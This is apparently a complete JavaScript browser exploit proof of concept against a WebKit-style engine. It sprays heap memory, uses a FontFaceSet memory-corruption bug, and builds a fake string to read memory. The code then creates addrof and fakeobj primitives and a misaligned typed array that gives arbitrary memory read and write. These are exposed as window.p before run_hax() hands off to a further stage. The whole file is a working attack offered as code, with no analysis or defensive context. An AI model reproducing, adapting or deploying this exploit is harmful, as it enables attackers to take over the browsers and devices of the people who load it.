var PAGE_SIZE = 16384;
var SIZEOF_CSS_FONT_FACE = 0xb8;
var HASHMAP_BUCKET = 208;
var STRING_OFFSET = 20;
var SPRAY_FONTS = 0x1000;
var GUESS_FONT = 0x200430000;
var NPAGES = 20;
var INVALID_POINTER = 0;
var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time

function poc() {

    function hex(n) {
        if ((typeof n) != "number")
            return "" + n;
        return "0x" + (new Number(n)).toString(16);
    }

    var union = new ArrayBuffer(8);
    var union_b = new Uint8Array(union);
    var union_i = new Uint32Array(union);
    var union_f = new Float64Array(union);

    var bad_fonts = [];

    for (var i = 0; i < SPRAY_FONTS; i++)
        bad_fonts.push(new FontFace("font1", "", {}));

    var good_font = new FontFace("font2", "url(data:text/html,)", {});
    bad_fonts.push(good_font);

    var arrays = [];
    for (var i = 0; i < 512; i++)
        arrays.push(new Array(31));

    arrays[256][0] = 1.5;
    arrays[257][0] = {};
    arrays[258][0] = 1.5;

    var jsvalue = {
        a: arrays[256],
        b: new Uint32Array(1),
        c: true
    };

    var string_atomifier = {};
    var string_id = 10000000;

    function ptrToString(p) {
        var s = '';
        for (var i = 0; i < 8; i++) {
            s += String.fromCharCode(p % 256);
            p = (p - p % 256) / 256;
        }
        return s;
    }

    function stringToPtr(p, o) {
        if (o === undefined)
            o = 0;
        var ans = 0;
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + p.charCodeAt(o + i);
        return ans;
    }

    var strings = [];

    function mkString(l, head) {
        var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
        string_atomifier[s] = 1;
        strings.push(s);
        return s;
    }

    var guf = GUESS_FONT;
    var ite = true;
    var matches = 0;

    do {

        var p_s = ptrToString(NPAGES + 2); // vector.size()
        for (var i = 0; i < NPAGES; i++)
            p_s += ptrToString(guf + i * PAGE_SIZE);
        p_s += ptrToString(INVALID_POINTER);

        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);

        var ffs = new FontFaceSet(bad_fonts);

        var badstr1 = mkString(HASHMAP_BUCKET, p_s);

        var guessed_font = null;
        var guessed_addr = null;

        for (var i = 0; i < SPRAY_FONTS; i++) {
            bad_fonts[i].family = "evil";
            if (badstr1.substr(0, p_s.length) != p_s) {
                guessed_font = i;
                var p_s1 = badstr1.substr(0, p_s.length);
                for (var i = 1; i <= NPAGES; i++) {
                    if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
                        guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
                        break;
                    }
                }
                if (matches++ == 0) {
                    guf = guessed_addr + 2 * PAGE_SIZE;
                    guessed_addr = null;
                }
                break;
            }
        }

        if ((ite = !ite))
            guf += NPAGES * PAGE_SIZE;

    }
    while (guessed_addr === null);

    var p_s = '';
    p_s += ptrToString(26);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    for (var i = 0; i < 19; i++)
        p_s += ptrToString(INVALID_POINTER);

    for (var i = 0; i < 256; i++)
        mkString(HASHMAP_BUCKET, p_s);

    var ffs2 = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
    var badstr2 = mkString(HASHMAP_BUCKET, p_s);
    mkString(HASHMAP_BUCKET, p_s);

    bad_fonts[guessed_font].family = "evil2";
    bad_fonts[guessed_font + 1].family = "evil3";

    var leak = stringToPtr(badstr2.substr(badstr2.length - 8));

    var ffses = {};

    function makeReader(read_addr, ffs_name) {
        var fake_s = '';
        fake_s += '0000'; //padding for 8-byte alignment
        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
        fake_s += ptrToString(read_addr); //where to read from
        fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
        p_s = '';
        p_s += ptrToString(29);
        p_s += ptrToString(guessed_addr);
        p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
        p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
        for (var i = 0; i < 18; i++)
            p_s += ptrToString(INVALID_POINTER);
        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);
        var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
        mkString(HASHMAP_BUCKET, p_s);
        var relative_read = mkString(HASHMAP_BUCKET, fake_s);
        bad_fonts[guessed_font].family = ffs_name + "_evil1";
        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
        if (relative_read.length < 1000) //failed
            return makeReader(read_addr, ffs_name + '_');
        return relative_read;
    }

    var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr

    for (var i = 0; i < 100000; i++)
        mkString(128, '');

    var props = [];
    for (var i = 0; i < 0x10000; i++) {
        props.push({
            value: 0x41434442
        });
        props.push({
            value: jsvalue
        });
    }

    var jsvalue_leak = null;

    while (jsvalue_leak === null) {
        Object.defineProperties({}, props);
        for (var i = 0;; i++) {
            if (fastmalloc.charCodeAt(i) == 0x42 &&
                fastmalloc.charCodeAt(i + 1) == 0x44 &&
                fastmalloc.charCodeAt(i + 2) == 0x43 &&
                fastmalloc.charCodeAt(i + 3) == 0x41 &&
                fastmalloc.charCodeAt(i + 4) == 0 &&
                fastmalloc.charCodeAt(i + 5) == 0 &&
                fastmalloc.charCodeAt(i + 6) == 254 &&
                fastmalloc.charCodeAt(i + 7) == 255 &&
                fastmalloc.charCodeAt(i + 24) == 14
            ) {
                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
                break;
            }
        }
    }

    var rd_leak = makeReader(jsvalue_leak, 'ffs4');
    var array256 = stringToPtr(rd_leak, 16); //arrays[256]
    var ui32a = stringToPtr(rd_leak, 24); //Uint32Array
    var sanity = stringToPtr(rd_leak, 32);

    var rd_arr = makeReader(array256, 'ffs5');
    var butterfly = stringToPtr(rd_arr, 8);

    var rd_ui32 = makeReader(ui32a, 'ffs6');
    for (var i = 0; i < 8; i++)
        union_b[i] = rd_ui32.charCodeAt(i);

    var structureid_low = union_i[0];
    var structureid_high = union_i[1];

    //setup for addrof/fakeobj
    //in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
    //in array[257] butterfly: 0 = {0x10000, 0x10000} as jsvalue
    union_i[0] = 0x10000;
    union_i[1] = 0; //account for nan-boxing
    arrays[257][1] = {}; //force it to still be jsvalue-array not double-array
    arrays[257][0] = union_f[0];
    union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
    union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
    arrays[256][i] = union_f[0];

    //hammer time!

    pp_s = '';
    pp_s += ptrToString(56);
    for (var i = 0; i < 12; i++)
        pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);

    var fake_s = '';
    fake_s += '0000'; //padding for 8-byte alignment
    fake_s += ptrToString(INVALID_POINTER); //never dereferenced
    fake_s += ptrToString(butterfly); //hammer target
    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34

    var ffs7_args = [];
    for (var i = 0; i < 12; i++)
        ffs7_args.push(bad_fonts[guessed_font + i]);
    ffs7_args.push(good_font);

    var ffs8_args = [bad_fonts[guessed_font + 12]];
    for (var i = 0; i < 5; i++)
        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));

    for (var i = 0; i < HAMMER_NSTRINGS; i++)
        mkString(HASHMAP_BUCKET, pp_s);

    var ffs7 = new FontFaceSet(ffs7_args);
    mkString(HASHMAP_BUCKET, pp_s);
    var ffs8 = new FontFaceSet(ffs8_args);
    mkString(HASHMAP_BUCKET, fake_s);

    for (var i = 0; i < 13; i++)
        bad_fonts[guessed_font + i].family = "hammer" + i;


    window.addrof = function (obj) {
        arrays[257][32] = obj;
        union_f[0] = arrays[258][0];
        return new int64(union_i[0], union_i[1]);
    }

    window.fakeobj = function (addr) {
        union_i[0] = addr.low;
        union_i[1] = addr.hi;
        arrays[258][0] = union_f[0];
        return arrays[257][32];
    }
    //craft misaligned typedarray

    var arw_master = new Uint32Array(8);
    var arw_slave = new Uint32Array(2);

    var addrof_slave = addrof(arw_slave);
    union_i[0] = structureid_low;
    union_i[1] = structureid_high;
    union_b[6] = 7;
    var obj = {
        jscell: union_f[0],
        butterfly: true,
        buffer: arw_master,
        size: 0x5678
    };

    (function () {
        var magic = fakeobj(addrof(obj).add32(0x10));
        magic[4] = addrof_slave.low;
        magic[5] = addrof_slave.hi;
        magic = null;
    })();

    var prim = {
        write8: function(addr, value) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            if(value instanceof int64) {
                arw_slave[0] = value.low;
                arw_slave[1] = value.hi;
            } else {
                arw_slave[0] = value;
                arw_slave[1] = 0;
            }
        },
        write4: function(addr, value) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            if(value instanceof int64) {
                arw_slave[0] = value.low;
            } else {
                arw_slave[0] = value;
            }
        },
        write2: function(addr, value) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            var tmp = arw_slave[0] & 0xFFFF0000;
            if(value instanceof int64) {
                arw_slave[0] = ((value.low & 0xFFFF) | tmp);
            } else {
                arw_slave[0] = ((value & 0xFFFF) | tmp);
            }
        },
        write1: function(addr, value) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            var tmp = arw_slave[0] & 0xFFFFFF00;
            if(value instanceof int64) {
                arw_slave[0] = ((value.low & 0xFF) | tmp);
            } else {
                arw_slave[0] = ((value & 0xFF) | tmp);
            }
        },
        read8: function(addr) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            return new int64(arw_slave[0], arw_slave[1]);
        },
        read4: function(addr) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            return arw_slave[0];
        },
        read2: function(addr) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            return arw_slave[0] & 0xFFFF;
        },
        read1: function(addr) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            return arw_slave[0] & 0xFF;
        },
        leakval: function(obj) {
            arrays[257][32] = obj;
            union_f[0] = arrays[258][0];
            return new int64(union_i[0], union_i[1]);
        }
    };
    window.p = prim;
    run_hax();
}